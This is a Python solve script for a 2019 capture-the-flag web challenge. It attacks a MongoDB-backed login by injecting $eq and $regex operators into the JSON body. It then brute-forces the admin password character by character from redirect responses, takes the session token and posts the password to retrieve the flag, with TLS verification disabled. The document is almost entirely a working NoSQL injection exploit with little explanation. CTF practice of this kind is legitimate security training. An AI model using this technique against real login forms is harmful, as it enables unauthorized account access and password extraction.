import requests # used to make requests
import string   # for building the password
import re       # for cheking token pattern and FLAG pattern

session = requests.Session() # creates a session, not really needed tho.
cookies = {"token": "fucking_dont_know_1337"}
URL = "https://nosequels.2019.chall.actf.co/login"

# make first GET request.
# this is only done to get the first unauthenticated token
jwt_token_re = re.compile(r"token=(.*);")
dummy = session.get(URL)

if dummy.status_code == 200:
    m = re.search(jwt_token_re, dummy.headers["Set-Cookie"])
    if m:
        cookies["token"] = str(m.group(1))
        print("[?] Cookie set")

# Creates new payload
new_payload = {"username": {"$eq": "admin" }, "password": {"$regex": None}}


restart_the_damn_loop = True # control the loop, no one want an infinite loop
regex_payload = "" # this is the current compared password 
flag = regex_payload # flag is initialized as regex payload == ""

while restart_the_damn_loop:
    restart_the_damn_loop = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        regex_payload += i
        new_payload["password"]["$regex"] = "^"+regex_payload + ".*"
        req = session.post(URL, verify=False, cookies=cookies, json=new_payload, allow_redirects=False)
        if req.status_code == 302: # a 302 repsonse code means payload passed
            restart_the_damn_loop = True
            flag += i
            if len(flag) == 14: # check if length == 14
                restart_the_damn_loop = False
                m = re.search(jwt_token_re, req.headers["Set-Cookie"])
                if m:
                    # sets the token cookie, we will use it when visiting /site
                    cookies["token"] = str(m.group(1))
                print("[?] pass till now : ", flag)
                break
        else:
            regex_payload = flag
            restart_the_damn_loop = True


# make last request and get the damn flag.

print("Password: " + flag)
URL = "https://nosequels.2019.chall.actf.co/site"

# POST Parameter for /site page is named : pass2
r = session.post(URL, verify=False, data={"pass2": flag}, cookies=cookies)
# setting verify=False is only better when solving CTF challenges.
# because we dont need it :D   
m = re.search(r"actf{.*}", r.text)
if m:
    print("[+] FLAG: ", m.group(0))

